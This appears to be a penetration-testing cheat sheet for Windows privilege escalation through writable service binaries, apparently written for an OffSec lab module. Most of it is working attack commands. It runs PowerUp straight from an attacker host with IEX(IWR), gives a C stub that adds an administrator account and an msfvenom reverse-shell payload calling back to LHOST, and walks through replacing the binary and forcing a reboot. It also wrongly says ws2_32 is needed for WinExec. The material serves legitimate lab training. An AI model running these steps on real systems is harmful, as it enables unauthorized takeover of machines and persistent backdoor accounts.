title: Weak Service Binary Permissions
body:
If the Users group has Full Access (F) or Change (C) on a service binary - or on the DIRECTORY containing it - you can replace it with your own and the service will run your code as whatever account it starts under. Module 17.2.1: enumerate with icacls/cacls, replace the binary, restart the service or reboot.

Enumerate: 'sc qc <svc>' for BINARY_PATH_NAME and SERVICE_START_NAME (LocalSystem is the prize), then 'cacls <path>' on both the folder and the exe. Folder-level write is enough - you can move the original aside and drop yours in its place.

THREE THINGS THAT MAKE THIS FAIL:

1. SCM KILLS A NON-SERVICE BINARY. A plain executable started by the Service Control Manager never answers the service control handshake, so SCM terminates it after the service start timeout (~30s). Beacons and staged payloads check in and then die. Use the smallest payload that connects IMMEDIATELY (windows/x64/shell_reverse_tcp, ~460 bytes), or wrap it so it spawns a child and returns.

2. AN ADDED ACCOUNT MAY BE UNREACHABLE. The common PoC pattern is a C stub that runs 'net user X P /add' and 'net localgroup Administrators X /add'. That only helps if you can actually authenticate as X - if 445 is ACCESS_DENIED and there is no WinRM/RDP, you have created an account you cannot use. Prefer a callback.

3. YOU GET ONE SHOT PER RESTART. Stage the swap, start the listener, THEN restart. Preserve the original binary (move bd.exe bd.service.exe) so the service can be restored and the box stays usable.
cmd:
# ══════════════════════════════════════════════════
# STEP 0 — AUTOMATED DISCOVERY (run these first)
# ══════════════════════════════════════════════════
# PowerUp — most reliable single command:
powershell -ep bypass -c "IEX(IWR 'http://<LHOST>/PowerUp.ps1' -UseBasicParsing); Get-ModifiableServiceFile"
# Output shows: ServiceName, Path, ModifiableFile, IdentityReference, Permissions
# Look for: Write, Modify, or FullControl for your user or Everyone/Authenticated Users

# accesschk — Sysinternals, faster than icacls sweep:
.\accesschk.exe /accepteula -uwcqv "Everyone" *
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "<username>" *
# RW or F on a service binary = exploitable

# Sliver / C2 shell — execute-assembly works well here:
execute-assembly PowerUp.ps1 -- -Command Get-ModifiableServiceFile

# ── MANUAL SWEEP (when tools are blocked) ─────────
# Get all service binary paths:
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"} | Select-Object -ExpandProperty PathName

# Strip arguments to get just the binary path and check each:
# (In cmd.exe — pipe to a file and review)
sc query type= all state= all | findstr "SERVICE_NAME\|BINARY_PATH"
wmic service get name,pathname,startmode | findstr /v "System32"   # non-system binaries

# Then check permissions on each interesting path:
icacls "C:\path\to\service.exe"
# F = Full control (you can replace it)
# M = Modify (you can replace it)
# RX = Read+Execute only (cannot replace)

# ── STEP 1: FIND VULNERABLE SERVICE BINARIES ─────────
# List running services with binary paths
# Note: needs RDP/interactive logon — WinRM gives permission denied
# sc.exe query for specific service config:
sc.exe qc <ServiceName>
sc.exe queryex <ServiceName>
# Get-CimInstance filter for specific service:
Get-CimInstance Win32_Service -Filter "Name='mysql'" | Select Name,State,StartName,ProcessId,PathName
# StartName = which user account runs the service

Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}

# ── STEP 2: CHECK BINARY PERMISSIONS ─────────────────
# F = Full access (can replace), RX = Read+Execute only (cannot replace)
icacls "C:\xampp\\mysql\\bin\\mysqld.exe"

# PowerUp automated check
. .\PowerUp.ps1
Get-ModifiableServiceFile

# GOTCHA (OffSec 17.2.1): PowerUp's Install-ServiceBinary AbuseFunction
# FAILS with "not modifiable by the current user" when the service PathName
# carries a FILE-PATH ARGUMENT, e.g.:
#   mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
# Get-ModifiablePath chokes on the path-shaped arg and returns EMPTY, so the
# AbuseFunction wrongly concludes you can't write it - even though icacls
# proved you have (F). Diagnose it:
echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
echo 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=C:\x\my.ini' | Get-ModifiablePath -Literal
# ^ second one returns EMPTY = the bug.
# FIX: don't trust the AbuseFunction here - replace the binary MANUALLY
# (STEP 4-5). PowerUp is for DETECTION; manual replace is the exploit.

# accesschk
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *

# ── STEP 3: CREATE MALICIOUS BINARY (on Kali) ─────────
# Method A — adduser.c (most reliable, no AV issues with net user):
cat > adduser.c << 'EOF'
#include <stdlib.h>
#include <windows.h>

int main(void) {
    // Add local admin user
    system("net user hacker pass123! /add");
    system("net localgroup Administrators hacker /add");
    // Restart the ORIGINAL binary so the service doesn't crash (prevents alerts)
    // Replace path below with the ORIGINAL binary you backed up:
    WinExec("C:\\Users\\<user>\\original.exe.bak", 0);
    return 0;
}
EOF

# Compile (link ws2_32 — required for WinExec):
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe -lws2_32
# 32-bit target (XAMPP is often x86):
i686-w64-mingw32-gcc adduser.c -o adduser32.exe -lws2_32

# Method B — reverse shell exe (when you need an interactive session):
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=443 -f exe -o shell.exe
# Note: if AV kills it, combine — use adduser.c to add an admin,
# then RDP/WinRM in as that user for a real interactive session.

# ── STEP 4: REPLACE THE BINARY ────────────────────────
# Backup original first!
move C:\xampp\\mysql\\bin\\mysqld.exe C:\\Users\\dave\\mysqld.exe.bak

# Transfer and place
iwr http://$lhost/adduser.exe -OutFile adduser.exe
move .\adduser.exe C:\xampp\\mysql\\bin\\mysqld.exe

# ── STEP 5: RESTART SERVICE ───────────────────────────
# Try manual restart (usually denied)
net stop mysql
net start mysql

# Check startup type
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like "mysql"}

# Check reboot privilege
whoami /priv | findstr Shutdown

# Reboot if Auto + SeShutdownPrivilege
shutdown /r /t 0

# ── STEP 6: VERIFY ────────────────────────────────────
Get-LocalGroupMember Administrators

# ── STEP 7: RESTORE ───────────────────────────────────
move C:\\Users\\dave\\mysqld.exe.bak C:\xampp\\mysql\\bin\\mysqld.exe
shutdown /r /t 0
warn: Always backup the original binary before replacing, note the change for the report, and restore it. Reboot only in labs. PowerUp GOTCHA: if the service path has a file-argument (--defaults-file=...), Install-ServiceBinary falsely reports 'not modifiable' - trust your icacls (F) result and replace manually instead.
